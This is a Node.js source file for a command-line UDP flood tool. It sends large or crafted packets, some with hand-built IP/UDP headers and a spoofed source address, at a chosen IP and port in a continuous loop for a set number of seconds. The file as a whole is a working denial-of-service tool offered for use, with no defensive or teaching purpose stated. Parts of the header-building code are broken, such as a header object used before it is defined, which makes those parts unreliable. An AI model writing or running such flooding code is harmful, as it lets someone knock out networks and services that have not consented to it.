// Modules
var args = process.argv.slice(2);
var dgram = require('dgram');
var IpHeader = require('ip-header');
var raw = require ("raw-socket");
var UdpHeader = require('udp-header');
var { inet_pton } = require('inet_xtoy');
var commander = require('commander');

// In order to open a UDP connection & close it
var client

// Do the IP Header thingy
function IPHEADER(ipd)
{
	var iph = new IpHeader({
		dst : ipd,
		src : inet_pton('192.168.255.255'),
		id : raw.htonl(5345),          
		offset : 0,              
		ttl : 84,              
		protocol : 'udp',          
		protocolCode : 17,   
		flags: { df: true },      
		length : 20,             
		totalLength : 78,         
		dataLength : 58
	});
	return iph;       
}	

// Make UDP Header from scratch
function UDPHEADER()
{
	var uph = new UdpHeader({
		srcPort : raw.htons(4738),
		dstPort : raw.htons(3283),
		length : raw.htons(uph.length + 5)
	});
	return uph;
}

// Sending an UDP packet
function SendUDP(HOST, PORT, METHOD)
{
	switch(METHOD)
	{
		//ICMP Method
		case 1 : 
		{
		    var message = new Buffer.from ([
				0x08, 0x00, 0x43, 0x52, 0x00, 0x01, 0x0a, 0x09,
				0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
				0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70,
				0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x61,
				0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69]);

		    console.log('Sending ICMP UDP Packets...');
		    break;
	    }
	    // Header Method
	    case 2 :
	    {
	    	var output = IPHEADER(HOST);
	    	output += UDPHEADER();
	    	output += [
				0x08, 0x00, 0x43, 0x52, 0x00, 0x01, 0x0a, 0x09,
				0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
				0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70,
				0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x61,
				0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69];
			
	    	var message = new Buffer(output);
	    	console.log('Sending HEADER UDP Packets...');
	    	break;
	    }
	    // Raw Method
	    default :
	    {
			var output = "";
			for (var i = 0; i < 65507; i++) {
				output += "L";
			};
			var message = new Buffer(output);

			console.log('Sending RAW UDP Packets...');
			break;
	    }
	}
	// Create a UDP4 Socket
	client = dgram.createSocket({
		type: 'udp4',
		reuseAddr: true
	});
	// Send UDP Packets
	client.send(message, 0, message.length, PORT, HOST, function(err, bytes) {
	  if (err) throw err;
	});
}

// Continuous Flood
function StartFlood(HOST, PORT, TIME, METHOD)
{
	// Cache the method because DUH
	var cache_method = METHOD;
	console.log('Flooding has started');
	// Start the flooding (an infinite loop may be better)
	setInterval
	var attacking_udp = setInterval(() => {
		SendUDP(HOST, PORT, cache_method);
	});
	// Stop the flooding
	setTimeout(() => {
		clearInterval(attacking_udp);
		client.close();
		console.log('Flooding has ended');
	}
	, TIME * 1000);
}

// Main Shit
var commanderHelp = commander
	.version('1.0.0 by DefinitelyNotJah')
	.option('-i, --ip <ip>', 'IP')
	.option('-p, --port [port]', 'Port', parseInt)
	.option('-t, --time [time]', 'Time in seconds.', parseInt)
	.option('-m, --method [method]', '0 for Raw, 1 for ICMP, 2 for HEADER.', parseInt);

commanderHelp.parse(process.argv);

if (commander.ip && commander.port && commander.time) {
	StartFlood(commander.ip, commander.port, commander.time, commander.method);
} 
else 
{
	commanderHelp.help();
}
